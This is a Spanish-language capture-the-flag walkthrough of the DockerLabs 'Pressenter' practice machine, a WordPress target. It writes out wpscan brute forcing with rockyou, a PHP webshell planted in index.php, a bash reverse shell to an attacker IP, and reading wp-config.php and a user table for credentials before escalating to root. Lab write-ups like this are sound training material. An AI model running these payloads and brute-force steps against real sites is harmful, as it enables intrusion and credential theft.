---
layout: post
title: "Pressenter"
date: 2024-11-08
 13:05:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Pressenter </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Escaneamos los puertos abiertos de la maquina; en esta ocasion solo tenemos el servicio web de apache.

`sudo nmap -p- --open -T5 --min-rate=5000 -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/pressenter/nmap.png){:.margin}

**2\.** Si revisamos el codigo de la web, vemos que carga recursos internos, este domino lo agregamos a nuestro hosts para que resuelva correctamente este dominio.

`http://172.17.0.2`

`sudo nano /etc/hosts`

`172.17.0.2  pressenter.hl`

![img](/notas/public/img/dockerlabs/pressenter/web.png){:.margin}
![img](/notas/public/img/dockerlabs/pressenter/webcode.png){:.margin}
![img](/notas/public/img/dockerlabs/pressenter/hosts.png){:.margin}

**3\.** Nos dirigimos a este dominio, vemos que tenemos un usuario potencial, al final de la pagina especifica que esta diseñado con wordpress.

`http://pressenter.hl`

![img](/notas/public/img/dockerlabs/pressenter/webpressenter.png){:.margin}

**4\.** Enumeramos los plugins vulnerables y usuarios, nos pilla dos usuarios pressi y hacker.

`wpscan --url http://pressenter.hl/ -e vp,u`

![img](/notas/public/img/dockerlabs/pressenter/wpscan.png){:.margin}

**5\.** Haciendo fuerza bruta damos con la contraseña del usuario pressi, no hace falta probar con el otro usuario ya que si vamos al panel login administrativo podemos acceder con este usuario.

`wpscan --url http://pressenter.hl/ -U pressi -P /usr/share/wordlists/rockyou.txt`

`http://pressenter.hl/wp-admin/`

![img](/notas/public/img/dockerlabs/pressenter/wpscanpressi.png){:.margin}
![img](/notas/public/img/dockerlabs/pressenter/paneladmin.png){:.margin}

**6\.** Vamos a plugins, instalamos  y activamos el administrador de archivos. Luego nos dirigimos al administrador y editamos el index.php, le agregamos el siguiente codigo php para obtener una webshell.

`<?php system($_GET['cmd']);?>`

![img](/notas/public/img/dockerlabs/pressenter/filemanager.png){:.margin}
![img](/notas/public/img/dockerlabs/pressenter/indexcmd.png){:.margin}

**7\.** Ahora obtendremos una reverse shell, nos ponemos en escucha con nc y nos enviamos la reverse shell.

`nc -nlvp 4000`

`http://pressenter.hl/?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.18.8/4000 0>%261"`

![img](/notas/public/img/dockerlabs/pressenter/reverseshell.png){:.margin}
![img](/notas/public/img/dockerlabs/pressenter/ncconnected.png){:.margin}

**8\.** Tenemos dos usuarios; revisando los precesos veo mysql activo; revisamos el fichero wp-config.php para encontrar las credenciales a la bd.

`grep bash /etc/passwd`

`ps -ax`

`nano wp-config.php`

![img](/notas/public/img/dockerlabs/pressenter/greppasswd.png){:.margin}
![img](/notas/public/img/dockerlabs/pressenter/ps.png){:.margin}
![img](/notas/public/img/dockerlabs/pressenter/wpconfig.png){:.margin}

**9\.** Ingresamos a mysql, listamos las base de datos y le indicamos que queremos usar la bd wordpress. 

`mysql -u admin -prooteable`

`show databases;`

`use wordpress`

![img](/notas/public/img/dockerlabs/pressenter/querys.png){:.margin}

**10\.** Listamos las tablas de la bd wordpress, listamos el contenido de la tabla wp_usernames y ahi tenemos las credenciales del usuario enter.

`show tables;`

`select * from wp_usernames`

![img](/notas/public/img/dockerlabs/pressenter/queryenter.png){:.margin}

**11\.** Migramos al usuario enter; al final esta contraseña se reutilizada para escalar privilegios a root.

`su enter`

`su root`

![img](/notas/public/img/dockerlabs/pressenter/suenter.png){:.margin}
![img](/notas/public/img/dockerlabs/pressenter/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>